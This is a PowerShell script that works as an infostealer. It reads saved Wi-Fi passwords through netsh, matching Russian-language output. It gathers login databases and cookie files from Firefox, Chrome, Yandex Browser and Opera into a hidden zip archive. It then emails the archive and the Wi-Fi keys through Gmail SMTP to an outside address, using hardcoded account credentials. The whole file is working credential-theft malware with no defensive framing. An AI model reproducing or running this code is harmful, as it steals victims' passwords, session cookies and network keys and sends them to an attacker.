# (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ ESSID=$name;PASS=$pass }} | Format-Table -AutoSize > $env:TEMP\p.txt
echo "qwe"
$e=""

$p=$env:TEMP+"\d"+(Get-Random -max 17071707)+".zip"

if(Test-Path -Path "C:\Program Files\7-Zip\7z.exe"){
    Set-Location -Path "C:\Program Files\7-Zip\";
    $arh="7"
  }
else{
  $arh="W"}
        
$lst = @{0=(($env:APPDATA+"\Mozilla\Firefox\Profiles\*"), "firefox", "logins.json","*.db");
        1=(($env:LOCALAPPDATA+"\Google\Chrome\User Data\Default\"), "chrome", "Login Data", "Cookies");
        2=(($env:LOCALAPPDATA+"\Yandex\YandexBrowser\User Data\Default\"), "browser", "Ya Passman Data", "Cookies");
        3=(($env:APPDATA+"\Opera Software\Opera Stable\"), "Opera123", "Login Data", "Cookies");
        4=(($env:APPDATA+"\Opera Software\Opera GX Stable111111\"), "Opera5656", "Login Data", "Cookies")}

for ($i=0; $i -lt 5; $i++){
  if(Test-Path -Path $lst[$i][0]){
    echo '+++++++++'
    echo ($lst[$i][0])
    #Stop-Process -Name $el[1] -ErrorAction SilentlyContinue;
    if("W"-in $arh){
      Get-ChildItem -Path $lst[$i][0] -Include $lst[$i][2], $lst[$i][3] -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p
    }
    else{
      .\7z.exe a $p (Get-ChildItem -Path $lst[$i][0] -Include  $lst[$i][2], $lst[$i][3] -Recurse) -spf -tzip
    }
  }
  else{
    echo $lst[$i][1];
    $e=$e+' '+$lst[$i][1]
  }
}

# echo "56565656565656565656565656"
# (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$n=$_.Matches.Groups[1].Value.Trim();$_} | %{(netsh wlan show profile name="$n" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$d=$_.Matches.Groups[1].Value.Trim();$_} | %{[PSCustomObject]@{E=$n;P=$d}} | Format-Table -AutoSize > $env:TEMP\w.txt
# $w=$env:TEMP+'\w.txt'
# if("7"-in $arh)
#   {.\7z.exe a $p $w -spf -tzip;echo " wqwe221ewwe"}
# else
#   {Compress-Archive -Path $w -Update -CompressionLevel Fastest -DestinationPath $p}
# echo "dadasdasdasdasasd"
#######################
attrib +H $p

$SMTPServer="smtp.gmail.com";$SMTPInfo=New-Object Net.Mail.SmtpClient($SmtpServer,587);$SMTPInfo.EnableSsl=$true
$SMTPInfo.Credentials=New-Object System.Net.NetworkCredential("f7swwq@gmail.com","parampam1");$ReportEmail=New-Object System.Net.Mail.MailMessage

$ReportEmail.From="f7swwq@gmail.com";$ReportEmail.To.Add("keklol2045@gmail.com");$ReportEmail.Subject="Error: "+$e
$s=New-Object Net.Mail.Attachment($p);
if("WinRAR"-in $arh)
  {$ReportEmail.Attachments.Add($s)}
else
  {$ReportEmail.Attachments.Add($s)};
$ff = ((netsh wlan show profiles) | Select-String "\:(.+)$" | %{$n=$_.Matches.Groups[1].Value.Trim();$_} | %{(netsh wlan show profile name="$n" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$d=$_.Matches.Groups[1].Value.Trim();$_} | %{[PSCustomObject]@{E=$n;P=$d}} | Format-Table -AutoSize)
$ff

$ReportEmail.Body = $ff
$SMTPInfo.Send($ReportEmail)

